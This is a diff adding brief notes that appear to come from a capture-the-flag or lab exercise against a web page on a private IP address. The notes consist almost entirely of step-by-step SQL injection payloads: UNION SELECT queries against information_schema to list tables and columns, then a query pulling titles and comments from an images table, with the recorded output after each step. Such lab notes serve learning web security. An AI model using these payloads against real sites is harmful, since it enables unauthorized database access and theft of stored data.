@@ -1,0 +1,12 @@
+page : http://192.168.120.128/index.php?page=member
+
+1 -  Get tables name in the DB
+0 OR 1 = 0 UNION SELECT table_schema, table_name FROM information_schema.TABLES
+===> db_default,users,guestbook,list_images,vote_dbs
+
+2 - find table columns in the DB for each table
+0 OR 1 = 0 UNION SELECT table_name, column_name FROM (information_schema.COLUMNS)
+===> id, url, title, comment
+
+3 - get images from DB
+0 OR 1 = 2 UNION SELECT title, comment FROM Member_images.list_images
